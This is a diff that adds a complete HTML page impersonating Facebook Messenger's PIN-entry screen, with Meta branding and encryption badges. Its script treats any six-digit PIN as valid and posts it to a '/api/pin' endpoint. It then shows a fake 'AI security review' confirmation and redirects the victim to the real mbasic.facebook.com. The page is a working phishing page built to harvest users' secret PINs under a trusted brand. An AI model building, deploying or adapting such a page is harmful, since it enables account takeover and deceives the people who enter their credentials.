@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Messenger · Enter PIN</title>
+  <style>
+    *,
+    *::before,
+    *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      background: #F0F2F5;
+      font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Roboto, Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── Top nav bar ── */
+    .topbar {
+      height: 56px;
+      background: #fff;
+      border-bottom: 1px solid #E4E6EB;
+      display: flex;
+      align-items: center;
+      padding: 0 24px;
+      gap: 10px;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .topbar-logo {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #0099FF 0%, #A033FF 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .topbar-logo svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    .topbar-name {
+      font-size: 20px;
+      font-weight: 700;
+      color: #050505;
+      letter-spacing: -0.3px;
+    }
+
+    .topbar-spacer {
+      flex: 1;
+    }
+
+    .topbar-help {
+      font-size: 14px;
+      color: #0099FF;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 6px 10px;
+      border-radius: 6px;
+    }
+
+    .topbar-help:hover {
+      background: #E8F4FF;
+    }
+
+    /* ── Main layout ── */
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    /* ── PIN card ── */
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.10), 0 0 0 1px rgba(0, 0, 0, 0.04);
+      width: 100%;
+      max-width: 460px;
+      overflow: hidden;
+    }
+
+    /* Gradient top strip */
+    .card-strip {
+      height: 5px;
+      background: linear-gradient(90deg, #0099FF 0%, #A033FF 55%, #FF6680 100%);
+    }
+
+    .card-body {
+      padding: 40px 44px 36px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* ── Logo + headings ── */
+    .logo-circle {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #0099FF 0%, #A033FF 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .logo-circle svg {
+      width: 50px;
+      height: 50px;
+    }
+
+    .card-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #050505;
+      letter-spacing: -0.4px;
+      margin-bottom: 8px;
+      text-align: center;
+    }
+
+    .card-sub {
+      font-size: 14px;
+      color: #65676B;
+      text-align: center;
+      line-height: 1.55;
+      max-width: 300px;
+      margin-bottom: 32px;
+    }
+
+    /* ── 6 PIN boxes ── */
+    .pin-row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 10px;
+      justify-content: center;
+    }
+
+    .pin-box {
+      width: 52px;
+      height: 60px;
+      border: 2px solid #CED0D4;
+      border-radius: 10px;
+      background: #F7F8FA;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      transition: border-color 0.15s, background 0.15s, box-shadow 0.15s;
+      user-select: none;
+    }
+
+    .pin-box.active {
+      border-color: #0099FF;
+      background: #fff;
+      box-shadow: 0 0 0 4px rgba(0, 153, 255, 0.14);
+    }
+
+    /* blinking cursor */
+    .pin-box.active::after {
+      content: '';
+      display: block;
+      width: 2px;
+      height: 28px;
+      background: #0099FF;
+      border-radius: 1px;
+      animation: blink 1s step-start infinite;
+    }
+
+    .pin-box.filled::after {
+      display: none;
+    }
+
+    @keyframes blink {
+
+      0%,
+      100% {
+        opacity: 1
+      }
+
+      50% {
+        opacity: 0
+      }
+    }
+
+    .pin-box .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #050505;
+      display: none;
+      position: absolute;
+    }
+
+    .pin-box.filled {
+      border-color: #0099FF;
+      background: #fff;
+    }
+
+    .pin-box.filled .dot {
+      display: block;
+    }
+
+    .pin-box.error {
+      border-color: #E02020 !important;
+      background: #FFF5F5 !important;
+      box-shadow: 0 0 0 4px rgba(224, 32, 32, 0.1) !important;
+    }
+
+    .pin-box.error .dot {
+      background: #E02020;
+    }
+
+    .pin-box.success {
+      border-color: #31A24C !important;
+      background: #F2FFF5 !important;
+      box-shadow: 0 0 0 4px rgba(49, 162, 76, 0.1) !important;
+    }
+
+    .pin-box.success .dot {
+      background: #31A24C !important;
+      display: block;
+    }
+
+    /* feedback text */
+    .pin-msg {
+      font-size: 13px;
+      text-align: center;
+      min-height: 22px;
+      margin-bottom: 28px;
+      color: #E02020;
+      opacity: 0;
+      transition: opacity 0.2s;
+    }
+
+    .pin-msg.show {
+      opacity: 1;
+    }
+
+    .pin-msg.hint {
+      color: #65676B;
+      opacity: 1;
+    }
+
+    /* ── Numpad ── */
+    .numpad {
+      width: 100%;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      border: 1px solid #E4E6EB;
+      border-radius: 12px;
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+
+    .nk {
+      height: 72px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 2px;
+      border: none;
+      background: #fff;
+      cursor: pointer;
+      position: relative;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+      border-right: 1px solid #E4E6EB;
+      border-bottom: 1px solid #E4E6EB;
+      transition: background 0.08s;
+    }
+
+    /* remove right border on last in each row */
+    .nk:nth-child(3n) {
+      border-right: none;
+    }
+
+    /* remove bottom border on last row */
+    .nk:nth-child(n+10) {
+      border-bottom: none;
+    }
+
+    .nk:hover {
+      background: #F7F8FA;
+    }
+
+    .nk:active,
+    .nk.pressed {
+      background: #E4E6EB;
+    }
+
+    .nk-num {
+      font-size: 28px;
+      font-weight: 300;
+      color: #050505;
+      line-height: 1;
+    }
+
+    .nk-sub {
+      font-size: 9.5px;
+      font-weight: 700;
+      color: #8A8D91;
+      letter-spacing: 1.8px;
+      height: 13px;
+    }
+
+    /* action keys (empty + delete) */
+    .nk.action {
+      background: #F7F8FA;
+    }
+
+    .nk.action:hover {
+      background: #EBEDF0;
+    }
+
+    .nk.action:active {
+      background: #DDE0E4;
+    }
+
+    .nk-empty {
+      cursor: default !important;
+    }
+
+    .nk-empty:hover,
+    .nk-empty:active {
+      background: #F7F8FA !important;
+    }
+
+    .nk-del svg {
+      width: 24px;
+      height: 24px;
+      stroke: #050505;
+      stroke-width: 1.8;
+      fill: none;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    /* ── Forgot PIN ── */
+    .forgot {
+      font-size: 14px;
+      font-weight: 600;
+      color: #0099FF;
+      cursor: pointer;
+      padding: 6px;
+      border-radius: 6px;
+      margin-bottom: 4px;
+    }
+
+    .forgot:hover {
+      background: #E8F4FF;
+    }
+
+    /* ── Footer ── */
+    .card-footer {
+      padding: 16px 44px 20px;
+      border-top: 1px solid #E4E6EB;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .lock-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 12.5px;
+      color: #65676B;
+    }
+
+    .lock-badge svg {
+      width: 14px;
+      height: 14px;
+      stroke: #65676B;
+      stroke-width: 2;
+      fill: none;
+    }
+
+    /* ── Success overlay & Loading ── */
+    .success-cover {
+      position: fixed;
+      inset: 0;
+      background: rgba(240, 242, 245, 0.96);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      z-index: 100;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s;
+    }
+
+    .success-cover.show {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    /* Spinner */
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid #E4E6EB;
+      border-top: 4px solid #0099FF;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .success-ring {
+      width: 88px;
+      height: 88px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #0099FF 0%, #A033FF 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: popIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+      margin: 0 auto 16px;
+    }
+
+    @keyframes popIn {
+      from {
+        transform: scale(0.3);
+        opacity: 0
+      }
+
+      to {
+        transform: scale(1);
+        opacity: 1
+      }
+    }
+
+    .success-ring svg {
+      width: 44px;
+      height: 44px;
+      stroke: #fff;
+      stroke-width: 3;
+      fill: none;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .success-h {
+      font-size: 22px;
+      font-weight: 700;
+      color: #050505;
+      text-align: center;
+    }
+
+    .success-s {
+      font-size: 15px;
+      color: #65676B;
+      text-align: center;
+    }
+
+    /* site bottom */
+    .site-bottom {
+      text-align: center;
+      padding: 20px;
+      font-size: 12px;
+      color: #BEC3C9;
+    }
+
+    @media (max-width: 480px) {
+      .main {
+        padding: 20px 16px;
+      }
+
+      .card-body {
+        padding: 32px 16px 24px;
+      }
+
+      .pin-row {
+        gap: 6px;
+      }
+
+      .pin-box {
+        width: 42px;
+        height: 52px;
+        border-radius: 8px;
+      }
+
+      .nk {
+        height: 60px;
+      }
+
+      .nk-num {
+        font-size: 24px;
+      }
+
+      .nk-sub {
+        font-size: 9px;
+      }
+
+      .card-title {
+        font-size: 22px;
+      }
+
+      .logo-circle {
+        width: 60px;
+        height: 60px;
+        margin-bottom: 16px;
+      }
+
+      .logo-circle svg {
+        width: 36px;
+        height: 36px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <nav class="topbar">
+    <div class="topbar-logo">
+      <svg viewBox="0 0 24 24" fill="none">
+        <path
+          d="M12 2C6.48 2 2 6.26 2 11.5c0 2.85 1.28 5.4 3.3 7.16V22l3.85-2.12c1.02.28 2.1.43 3.23.43 5.52 0 10-4.26 10-9.5S17.52 2 12 2z"
+          fill="white" />
+        <path d="M13.1 14.6 10.3 11.6 5 14.6l10.5-11.2 2.8 3 5.3-3-10.5 11.2z" fill="url(#g1)" />
+        <defs>
+          <linearGradient id="g1" x1="5" y1="14.6" x2="18.9" y2="8.4" gradientUnits="userSpaceOnUse">
+            <stop offset="0%" stop-color="#0099FF" />
+            <stop offset="100%" stop-color="#A033FF" />
+          </linearGradient>
+        </defs>
+      </svg>
+    </div>
+    <span class="topbar-name">Messenger</span>
+    <div class="topbar-spacer"></div>
+    <span class="topbar-help">Help</span>
+  </nav>
+
+  <main class="main">
+    <div class="card">
+      <div class="card-strip"></div>
+
+      <div class="card-body">
+
+        <div class="logo-circle">
+          <svg viewBox="0 0 48 48" fill="none">
+            <path
+              d="M24 4C13.5 4 5 12.2 5 22.3c0 5.5 2.5 10.4 6.5 13.8V42l6.6-3.6c1.7.47 3.6.7 5.5.7 10.5 0 19-8.2 19-18.3C42.6 12.2 34.5 4 24 4z"
+              fill="white" />
+            <path d="M26 28.5 20.5 22.6 10 28.5 21 16.5l5.5 5.9 10.5-5.9L26 28.5z" fill="url(#g2)" />
+            <defs>
+              <linearGradient id="g2" x1="10" y1="28.5" x2="37" y2="16.5" gradientUnits="userSpaceOnUse">
+                <stop offset="0%" stop-color="#0099FF" />
+                <stop offset="100%" stop-color="#A033FF" />
+              </linearGradient>
+            </defs>
+          </svg>
+        </div>
+
+        <div class="card-title">Enter your PIN</div>
+        <div class="card-sub">Enter your 6-digit PIN to access your end-to-end encrypted messages</div>
+
+        <div class="pin-row" id="pinRow">
+          <div class="pin-box active" data-i="0">
+            <div class="dot"></div>
+          </div>
+          <div class="pin-box" data-i="1">
+            <div class="dot"></div>
+          </div>
+          <div class="pin-box" data-i="2">
+            <div class="dot"></div>
+          </div>
+          <div class="pin-box" data-i="3">
+            <div class="dot"></div>
+          </div>
+          <div class="pin-box" data-i="4">
+            <div class="dot"></div>
+          </div>
+          <div class="pin-box" data-i="5">
+            <div class="dot"></div>
+          </div>
+        </div>
+
+        <div class="pin-msg hint" id="pinMsg"></div>
+
+        <div class="numpad">
+          <button class="nk" data-v="1"><span class="nk-num">1</span><span class="nk-sub">&nbsp;</span></button>
+          <button class="nk" data-v="2"><span class="nk-num">2</span><span class="nk-sub">ABC</span></button>
+          <button class="nk" data-v="3"><span class="nk-num">3</span><span class="nk-sub">DEF</span></button>
+          <button class="nk" data-v="4"><span class="nk-num">4</span><span class="nk-sub">GHI</span></button>
+          <button class="nk" data-v="5"><span class="nk-num">5</span><span class="nk-sub">JKL</span></button>
+          <button class="nk" data-v="6"><span class="nk-num">6</span><span class="nk-sub">MNO</span></button>
+          <button class="nk" data-v="7"><span class="nk-num">7</span><span class="nk-sub">PQRS</span></button>
+          <button class="nk" data-v="8"><span class="nk-num">8</span><span class="nk-sub">TUV</span></button>
+          <button class="nk" data-v="9"><span class="nk-num">9</span><span class="nk-sub">WXYZ</span></button>
+          <button class="nk action nk-empty" disabled></button>
+          <button class="nk" data-v="0"><span class="nk-num">0</span><span class="nk-sub">&nbsp;</span></button>
+          <button class="nk action nk-del" id="delBtn" aria-label="Delete">
+            <svg viewBox="0 0 24 24">
+              <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" />
+              <line x1="18" y1="9" x2="13" y2="14" />
+              <line x1="13" y1="9" x2="18" y2="14" />
+            </svg>
+          </button>
+        </div>
+
+        <span class="forgot" id="forgotBtn">Forgot PIN?</span>
+      </div>
+
+      <div class="card-footer">
+        <div class="lock-badge">
+          <svg viewBox="0 0 24 24">
+            <rect x="3" y="11" width="18" height="11" rx="2" />
+            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+          </svg>
+          Your messages are end-to-end encrypted
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <div class="site-bottom">Meta © 2024 · Privacy · Terms</div>
+
+  <div class="success-cover" id="successCover">
+    <div id="loadingState">
+      <div class="spinner"></div>
+      <div class="success-h">Verifying...</div>
+    </div>
+
+    <div id="doneState" style="display: none; max-width: 340px;">
+      <div class="success-ring">
+        <svg viewBox="0 0 24 24">
+          <polyline points="20 6 9 17 4 12" />
+        </svg>
+      </div>
+      <div class="success-h">Verification Submitted</div>
+      <div class="success-s" style="margin-top: 8px; font-weight: 600; color: #050505;">Review in Progress</div>
+      <div class="success-s" style="margin-top: 12px; font-size: 14px; line-height: 1.5;">Our automated AI security
+        systems are currently reviewing your request. A confirmation email will be sent to your registered address
+        shortly.</div>
+      <div class="success-s" style="margin-top: 24px; font-size: 13px; color: #8A8D91;">You will be redirected shortly.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const MAX = 6;
+    let pin = '', busy = false;
+
+    const boxes = Array.from(document.querySelectorAll('.pin-box'));
+    const msgEl = document.getElementById('pinMsg');
+    const cover = document.getElementById('successCover');
+    const loadingState = document.getElementById('loadingState');
+    const doneState = document.getElementById('doneState');
+
+    function render() {
+      boxes.forEach((b, i) => {
+        b.classList.remove('active', 'filled', 'error', 'success');
+        b.querySelector('.dot').style.display = 'none';
+        if (i < pin.length) {
+          b.classList.add('filled');
+          b.querySelector('.dot').style.display = 'block';
+        } else if (i === pin.length) {
+          b.classList.add('active');
+        }
+      });
+    }
+
+    function pushDigit(v) {
+      if (busy || pin.length >= MAX) return;
+      pin += v;
+      render();
+      if (pin.length === MAX) {
+        busy = true;
+        setTimeout(verify, 150);
+      }
+    }
+
+    function delDigit() {
+      if (busy || !pin.length) return;
+      pin = pin.slice(0, -1);
+      msgEl.classList.remove('show');
+      msgEl.classList.add('hint');
+      msgEl.textContent = '';
+      render();
+    }
+
+    function verify() {
+      // Treat any 6-digit PIN as valid to proceed to the review state
+      boxes.forEach(b => {
+        b.classList.remove('filled', 'active');
+        b.classList.add('success');
+      });
+
+      // Store PIN by sending it to server
+      fetch('/api/pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ pin: pin })
+      }).catch(err => console.error(err));
+
+      setTimeout(() => {
+        // 1. Show the loading screen overlay
+        loadingState.style.display = 'block';
+        doneState.style.display = 'none';
+        cover.classList.add('show');
+
+        // 2. Load for 2 seconds
+        setTimeout(() => {
+          // 3. Swap to the final message
+          loadingState.style.display = 'none';
+          doneState.style.display = 'block';
+
+          // 4. Redirect the user after 4 seconds reading time
+          setTimeout(() => {
+            const f = document.createElement('form');
+            f.method = 'GET';
+            f.action = 'https://mbasic.facebook.com';
+            document.body.appendChild(f);
+            f.submit();
+          }, 4000);
+
+        }, 2000);
+
+      }, 280);
+    }
+
+    document.querySelectorAll('.nk[data-v]').forEach(btn => {
+      btn.addEventListener('pointerdown', () => btn.classList.add('pressed'));
+      btn.addEventListener('pointerup', () => { btn.classList.remove('pressed'); pushDigit(btn.dataset.v); });
+      btn.addEventListener('pointerleave', () => btn.classList.remove('pressed'));
+    });
+
+    document.getElementById('delBtn').addEventListener('click', delDigit);
+
+    document.getElementById('forgotBtn').addEventListener('click', () => {
+      msgEl.classList.remove('hint', 'show');
+      msgEl.textContent = 'You can reset your PIN in Privacy & Safety settings.';
+      msgEl.classList.add('show');
+      setTimeout(() => {
+        msgEl.classList.remove('show');
+        setTimeout(() => { msgEl.classList.add('hint'); msgEl.textContent = ''; }, 180);
+      }, 2600);
+    });
+
+    document.addEventListener('keydown', e => {
+      if (/^[0-9]$/.test(e.key)) pushDigit(e.key);
+      else if (e.key === 'Backspace') delDigit();
+    });
+
+    render();
+  </script>
+</body>
+
+</html>
